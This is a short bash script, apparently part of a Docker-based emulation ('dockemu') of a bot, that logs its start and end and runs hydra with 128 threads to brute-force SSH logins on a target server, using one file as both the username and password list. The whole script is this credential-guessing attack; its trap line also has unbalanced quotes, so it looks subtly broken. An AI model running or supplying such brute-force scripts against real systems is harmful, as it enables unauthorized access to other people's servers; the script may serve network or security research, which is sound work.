#!/bin/bash



trap 'echo "ATTEMPTS: $(cat $name |grep ATTEMPT |wc -l) ; echo "[ENDING  $(date +%D-%T) ]" | tee -a $log_file; exit 0; ' SIGINT SIGTERM

log_dir="/var/log/dockemu"
log_file=${1:-"$RANDOM"}

export name=$log_file
export log_file=${log_dir}/${log_file}.log

echo "LOGFILE:" $log_file

echo "[STARTING BOT-ID: $name $(date +%D-%T) ]" | tee -a $log_file

sleep 1

hydra -L /passwords -V -P /passwords -t 128 $server ssh | tee -a $name.log 
